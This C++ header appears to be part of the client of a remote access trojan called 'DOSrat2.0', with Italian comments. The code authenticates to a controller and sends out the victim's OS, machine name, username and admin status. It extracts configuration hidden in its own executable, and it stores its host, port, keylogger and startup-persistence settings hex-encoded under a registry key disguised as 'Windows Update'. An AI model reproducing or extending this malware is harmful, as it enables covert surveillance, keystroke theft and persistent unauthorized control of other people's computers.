#pragma once

class COMUNICAZIONI
{
private:
	static void TerminaConnessione(SOCKET Sock)
	{
		TcpIP::SetTimeout(0, Sock);
		closesocket(Sock);
	}

public:
	static bool Inizializzazione(SOCKET Sock)
	{
		DirUtils du;
		SystemUtils su;

		char Pass[10] = "DOSrat2.0";

		TcpIP::SetTimeout(10000, Sock);

		if (send(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if (recv(Sock, Pass, sizeof(Pass), 0) == SOCKET_ERROR)
		{
			TerminaConnessione(Sock);
			return false;
		}
		if ((string)Pass != "DOSrat2.0")
		{
			TerminaConnessione(Sock);
			return false;
		}

		TcpIP::SetTimeout(0, Sock);
		json data;

		data["InstallPath"] = du.GetFullModuleFilePath();
		data["OS"] = su.GetOS();
		data["PCname"] = su.GetPCName();
		data["UAC"] = (su.CheckUAC()) ? "Admin" : "User";
		data["UserName"] = su.GetCurrentUser();
		data["Versione"] = Version;

		TcpIP::SendString(Sock, data.dump());

		return true;
	}

	static bool GetInfo(SOCKET Sock, string Str)
	{
		if (TcpIP::SendString(Sock, Str))
			return true;

		return false;
	}

	static bool InvertMouse(SOCKET Sock, bool MouseStatus)
	{
		if (MouseStatus)
		{
			if (TcpIP::SendString(Sock, "a"))
				return true;
		}
		else
			if (TcpIP::SendString(Sock, "b"))
				return true;

		return false;
	}

	static string UpdateClient(SOCKET Sock)
	{
		string Buff = TcpIP::RecvString(Sock);

		if (Buff != "")
		{
			if (TcpIP::SendString(Sock, "OK"))
				return Buff;
			else
				return "";
		}
		else
		{
			TcpIP::SendString(Sock, "NO");
			
			return "";
		}

		return "";
	}
};

// Classe per la gestione dei settaggi
class Settaggi
{
private:
	DirUtils du;
	SettingsFile sf;
	RegUtils ru;
	Encode en;

public:
	string Host = "127.0.0.1";
	int Porta = 5555;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool KeyLogger = true;

	// Costruttore
	Settaggi()
	{
		sf.SetFileName(du.GetModuleFilePath() + "Sett");
		sf.HideFileContent(sf.Hex);
	}

	// Popola i settaggi ottenendoli dal relativo file
	void GetSettingsFromExe()
	{
		du.WriteFile(du.GetModuleFilePath() + "Sett", SimpleFind(du.GetBinaryFileContent(du.GetFullModuleFilePath()), en.AsciiToHex("{START}"), en.AsciiToHex("{END}")));

		Host = sf.GetSetting("Host");
		Porta = stoi(sf.GetSetting("Port"));
		InstallPath = sf.GetSetting("InstallPath");
		ExeName = sf.GetSetting("ExeName");
		RegStartup = (sf.GetSetting("RegStartup") == "true");
		KeyLogger = (sf.GetSetting("KeyLogger") == "true");

		du.DelFile(du.GetModuleFilePath() + "Sett");
	}

	// Popola i settaggi ottenendoli dal registro
	void GetSettingsFromReg()
	{
		Host = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Host").c_str(), REG_SZ));
		Porta = stoi(en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ)));
		ExeName = en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ));
		RegStartup = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ)) == "true");
		KeyLogger = (en.HexToAscii(ru.RegRead("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ)) == "true");
	}

	// Scrive i settaggi su registro
	void InstallSettings()
	{
		GetSettingsFromExe();

		ru.RegMakeKey("SOFTWARE\\Windows Update");

		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Host").c_str(), REG_SZ, en.AsciiToHex(Host).c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("Port").c_str(), REG_SZ, en.AsciiToHex(to_string(Porta)).c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("ExeName").c_str(), REG_SZ, en.AsciiToHex(ExeName).c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("RegStartup").c_str(), REG_SZ, en.AsciiToHex((RegStartup) ? "true" : "false").c_str());
		ru.RegWrite("SOFTWARE\\Windows Update", en.AsciiToHex("KeyLogger").c_str(), REG_SZ, en.AsciiToHex((KeyLogger) ? "true" : "false").c_str());
	}
};